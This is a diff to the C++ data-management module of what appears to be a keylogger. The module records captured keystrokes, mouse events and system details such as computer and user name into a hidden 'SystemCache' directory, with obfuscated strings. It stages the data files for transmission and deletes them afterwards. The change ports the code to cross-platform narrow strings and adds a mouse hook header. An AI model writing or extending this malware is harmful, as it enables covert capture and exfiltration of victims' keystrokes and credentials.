@@ -8,12 +8,13 @@
 #include "utils/StringUtils.h"
 #include <algorithm>
 #include <sstream>
-#include <chrono>
+#include <chrono>   
 #include <thread>
 #include <iomanip>
 #include <vector>
 #include <cstdint>
 #include <string>
+#include "MouseHook.h"
 
 // Obfuscated strings
 constexpr auto OBF_DATA_MANAGER = OBFUSCATE("DataManager");
@@ -28,16 +29,19 @@ DataManager::~DataManager() {
 }
 
 void DataManager::InitializeStorage() {
-    m_storagePath = utils::FileUtils::GetAppDataPath() + L"\\SystemCache\\";
+#if PLATFORM_WINDOWS
+    m_storagePath = utils::FileUtils::GetAppDataPath() + "\\SystemCache\\";
+#else
+    m_storagePath = utils::FileUtils::GetAppDataPath() + "/.SystemCache/";
+#endif
+    
     utils::FileUtils::CreateDirectories(m_storagePath);
     
     // Create initial data file
-    std::wstring filename = L"data_" + utils::StringUtils::Utf8ToWide(
-        utils::TimeUtils::GetCurrentTimestamp(true)) + L".bin";
+    std::string filename = "data_" + utils::TimeUtils::GetCurrentTimestamp(true) + ".bin";
     m_currentDataFile = m_storagePath + filename;
     
-    LOG_INFO("Data storage initialized at: " + 
-             utils::StringUtils::WideToUtf8(m_storagePath));
+    LOG_INFO("Data storage initialized at: " + m_storagePath);
 }
 
 void DataManager::AddKeyData(const KeyData& keyData) {
@@ -92,7 +96,7 @@ std::vector<uint8_t> DataManager::RetrieveEncryptedData() {
     FlushAllData();
     
     // Get all data files that are ready for transmission
-    std::vector<std::wstring> dataFiles = GetDataFilesReadyForTransmission();
+    std::vector<std::string> dataFiles = GetDataFilesReadyForTransmission();
     std::vector<uint8_t> allData;
     
     for (const auto& file : dataFiles) {
@@ -100,8 +104,7 @@ std::vector<uint8_t> DataManager::RetrieveEncryptedData() {
         if (!fileData.empty()) {
             // Add file delimiter with metadata
             std::string delimiter = "FILE_DELIMITER:" + 
-                utils::StringUtils::WideToUtf8(
-                    utils::FileUtils::GetFileName(file)) + 
+                utils::FileUtils::GetFileName(file) + 
                 ":SIZE:" + std::to_string(fileData.size()) + "\n";
             
             allData.insert(allData.end(), 
@@ -116,7 +119,7 @@ std::vector<uint8_t> DataManager::RetrieveEncryptedData() {
     }
     
     if (allData.empty()) {
-        return std::vector<uint8_t>();
+        return {};
     }
     
     // Add metadata header
@@ -143,7 +146,7 @@ void DataManager::ClearData() {
     std::lock_guard<std::mutex> lock(m_dataMutex);
     
     // Delete all transmitted files
-    auto allFiles = utils::FileUtils::ListFiles(m_storagePath, L"*.transmitted");
+    auto allFiles = utils::FileUtils::ListFiles(m_storagePath, "*.transmitted");
     for (const auto& file : allFiles) {
         utils::FileUtils::DeleteFile(file);
     }
@@ -200,7 +203,7 @@ void DataManager::FlushSystemEvents() {
     }
 }
 
-void DataManager::AppendToFile(const std::wstring& path, const std::string& data) {
+void DataManager::AppendToFile(const std::string& path, const std::string& data) {
     std::vector<uint8_t> currentData = utils::FileUtils::ReadBinaryFile(path);
     std::string currentStr(currentData.begin(), currentData.end());
     
@@ -233,23 +236,20 @@ void DataManager::RotateDataFileIfNeeded() {
 
 void DataManager::RotateDataFile() {
     // Close current file and create new one
-    std::wstring filename = L"data_" + utils::StringUtils::Utf8ToWide(
-        utils::TimeUtils::GetCurrentTimestamp(true)) + L".bin";
+    std::string filename = "data_" + utils::TimeUtils::GetCurrentTimestamp(true) + ".bin";
     m_currentDataFile = m_storagePath + filename;
     
-    LOG_DEBUG("Rotated data file to: " + 
-             utils::StringUtils::WideToUtf8(m_currentDataFile));
+    LOG_DEBUG("Rotated data file to: " + m_currentDataFile);
 }
 
-std::vector<std::wstring> DataManager::GetDataFilesReadyForTransmission() const {
-    std::vector<std::wstring> files;
-    auto allFiles = utils::FileUtils::ListFiles(m_storagePath, L"*.bin");
+std::vector<std::string> DataManager::GetDataFilesReadyForTransmission() {
+    std::vector<std::string> files;
+    auto allFiles = utils::FileUtils::ListFiles(m_storagePath, "*.bin");
     
     for (const auto& file : allFiles) {
         // Skip current active file and already transmitted files
         if (file != m_currentDataFile && 
-            !utils::StringUtils::EndsWith(
-                utils::StringUtils::WideToUtf8(file), ".transmitted")) {
+            !utils::StringUtils::EndsWith(file, ".transmitted")) {
             
             // Check if file is old enough to transmit (at least 1 minute old)
             auto modifiedTime = utils::FileUtils::GetFileModifiedTime(file);
@@ -265,23 +265,22 @@ std::vector<std::wstring> DataManager::GetDataFilesReadyForTransmission() const 
     return files;
 }
 
-void DataManager::MarkFileAsTransmitted(const std::wstring& filePath) {
-    std::wstring newPath = filePath + L".transmitted";
+void DataManager::MarkFileAsTransmitted(const std::string& filePath) {
+    std::string newPath = filePath + ".transmitted";
     utils::FileUtils::MoveFile(filePath, newPath);
     
     // Schedule for deletion after 24 hours
     ScheduleFileDeletion(newPath, 24 * 60 * 60 * 1000);
 }
 
-void DataManager::ScheduleFileDeletion(const std::wstring& filePath, uint64_t delayMs) {
+void DataManager::ScheduleFileDeletion(const std::string& filePath, uint64_t delayMs) {
     // This would be implemented with a background thread or system timer
     // For now, we'll just log the intention
-    LOG_DEBUG("Scheduled file for deletion: " + 
-             utils::StringUtils::WideToUtf8(filePath) + 
+    LOG_DEBUG("Scheduled file for deletion: " + filePath + 
              " in " + std::to_string(delayMs) + "ms");
 }
 
-std::string DataManager::KeyDataToString(const KeyData& data) const {
+std::string DataManager::KeyDataToString(const KeyData& data) {
     std::stringstream ss;
     ss << "KEY|" << data.timestamp << "|"
        << static_cast<int>(data.eventType) << "|"
@@ -291,7 +290,7 @@ std::string DataManager::KeyDataToString(const KeyData& data) const {
     return ss.str();
 }
 
-std::string DataManager::MouseDataToString(const MouseData& data) const {
+std::string DataManager::MouseDataToString(const MouseData& data) {
     std::stringstream ss;
     ss << "MOUSE|" << data.timestamp << "|"
        << static_cast<int>(data.eventType) << "|"
@@ -301,7 +300,7 @@ std::string DataManager::MouseDataToString(const MouseData& data) const {
     return ss.str();
 }
 
-std::string DataManager::SystemInfoToString(const SystemInfo& info) const {
+std::string DataManager::SystemInfoToString(const SystemInfo& info) {
     std::stringstream ss;
     ss << "SYSINFO|" << info.timestamp << "|"
        << info.computerName << "|" << info.userName << "|"
